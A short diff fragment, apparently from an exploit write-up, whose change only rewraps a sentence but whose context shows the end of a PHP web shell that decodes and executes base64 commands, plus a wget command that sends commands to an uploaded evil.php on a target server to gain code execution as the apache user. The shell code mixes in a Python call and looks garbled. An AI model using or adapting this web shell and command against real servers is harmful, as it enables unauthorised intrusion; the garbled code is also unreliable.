@@ -85,7 +85,8 @@ $decode=base64_decode($cmd);
 os.system($decode);
 ?>
 
-Once the malicious file is in place, pass base64 encoded commands to it, and get basic code execution on the web server, as the "apache" user.
+Once the malicious file is in place, pass base64 encoded commands to it, and get basic code execution 
+on the web server, as the "apache" user.
 
 wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo id|base64)
 cat output
